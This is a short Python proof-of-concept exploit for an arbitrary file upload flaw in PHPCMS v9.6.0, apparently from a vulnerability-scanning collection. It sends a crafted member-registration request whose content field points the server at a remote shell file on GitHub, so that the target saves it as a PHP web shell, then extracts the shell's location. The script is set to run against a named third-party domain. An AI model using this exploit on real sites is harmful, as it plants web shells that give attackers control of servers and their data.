# coding: utf-8
import re
import requests


def poc(url):
    if not url.startswith('http://'):
        url = 'http://' + url
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '2',
        'username': 'teggv',
        'password': 'teqstxxxx1',
        'email': 'tegqg@texxxst.com',
        'info[content]': '<img src=http://raw.githubusercontent.com/SecWiki/CMS-Hunter/master/PHPCMS/PHPCMS_v9.6.0_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/shell.txt?.php#.jpg>',
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data)

    shell = ''
    re_result = re.findall('&lt;img src=(.*)&gt', rep.text)
    # print (rep.text)
    if len(re_result):
        shell = re_result[0]
        return {'payload': u, 'post_data': data, 'info': 'phpcms v9 前台任意文件上传', 'extra': shell}

if __name__ == '__main__':
    poc('http://www.corner.com.cn')  # 目标站点根目录